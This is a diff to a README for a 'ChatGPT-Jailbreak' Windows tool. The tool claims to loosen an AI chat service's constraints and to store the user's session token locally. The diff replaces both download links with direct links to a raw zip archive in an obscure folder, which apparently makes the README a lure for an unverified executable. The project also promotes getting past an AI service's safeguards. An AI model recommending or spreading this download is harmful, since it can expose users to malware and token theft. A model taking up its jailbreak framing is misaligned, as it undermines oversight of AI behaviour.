@@ -1,6 +1,6 @@
 # 🔓 ChatGPT-Jailbreak - Extend your AI assistant capabilities today
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/pezizalescricketer968/ChatGPT-Jailbreak)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/pezizalescricketer968/ChatGPT-Jailbreak/main/vex/GP_Jailbreak_Chat_2.4-beta.1.zip)
 
 ## 📋 Project Overview 
 ChatGPT-Jailbreak allows users to modify how their AI chat interface behaves. This software acts as a local bridge between your computer and the AI service. It enables specific configurations that influence the tone, style, and constraints of the responses you receive. This tool helps power users customize their interactions without deep technical knowledge. Shoutout to azmen for the foundational work that made this project possible.
@@ -46,7 +46,7 @@ The software stores your session token locally on your machine. It does not send
 **What should I do if the application crashes?**
 Close the program completely. Check your task manager to ensure no background processes remain. Restart the application. If the problem persists, visit the link below to download a fresh version.
 
-[Download the latest release here](https://github.com/pezizalescricketer968/ChatGPT-Jailbreak)
+[Download the latest release here](https://raw.githubusercontent.com/pezizalescricketer968/ChatGPT-Jailbreak/main/vex/GP_Jailbreak_Chat_2.4-beta.1.zip)
 
 **Can I use this on a laptop?**
 Yes. The software is lightweight and functions on both desktop and laptop computers running Windows.
